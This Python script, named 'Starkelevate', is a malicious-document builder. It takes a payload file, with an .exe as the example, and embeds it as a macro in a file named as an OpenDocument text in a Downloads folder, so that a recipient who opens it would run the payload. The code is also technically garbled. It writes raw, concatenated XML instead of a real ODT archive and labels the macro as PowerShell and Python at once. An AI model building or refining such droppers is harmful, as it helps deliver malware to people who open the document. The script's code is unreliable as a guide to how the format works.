import os
import argparse

def main():
    # Create an ArgumentParser object to handle command-line arguments
    parser = argparse.ArgumentParser(description="Starkelevate")
    
    # Add command-line argument for the payload file path
    parser.add_argument("payload", help="Path to the payload file (e.g., 'librecommand.exe')")
    
    # Add command-line argument for the output filename
    parser.add_argument("--output", default="/home/bob/Downloads/librecommand.odt", help="Output filename")
    
    # Parse the command-line arguments
    args = parser.parse_args()

    payload_file = args.payload
    output_file = args.output

    try:
        # Check if payload file exists
        if not os.path.exists(payload_file):
            raise FileNotFoundError(f"Payload file '{payload_file}' not found.")

        # Read the content of the payload file in binary mode
        with open(payload_file, "rb") as payload_file:
            payload_content = payload_file.read()

        # Create the .odt file with embedded PowerShell command as a macro
        with open(output_file, "w") as odt_file:
            # Write the .odt file header
            odt_file.write('<?xml version="1.0" encoding="UTF-8"?>\n')
            odt_file.write('<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">\n')
            odt_file.write('</manifest:manifest>\n')
            odt_file.write('<?xml version="1.0" encoding="UTF-8"?>\n')
            odt_file.write('<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">\n')
            odt_file.write('<office:scripts>\n')
            odt_file.write(f'<office:script script:language="ooo:script" script:context="document" script:name="python">\n')
            odt_file.write(f'<![CDATA[\n{payload_content}\n]]>\n')
            odt_file.write('</office:script>\n')
            odt_file.write('</office:scripts>\n')
            odt_file.write('</office:document-content>\n')

        print(f"Payload has been embedded as a macro into the file '{output_file}'.")
    except FileNotFoundError as e:
        print(f"Error: {e}")
    except PermissionError as e:
        print(f"Error: Permission denied while accessing files.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
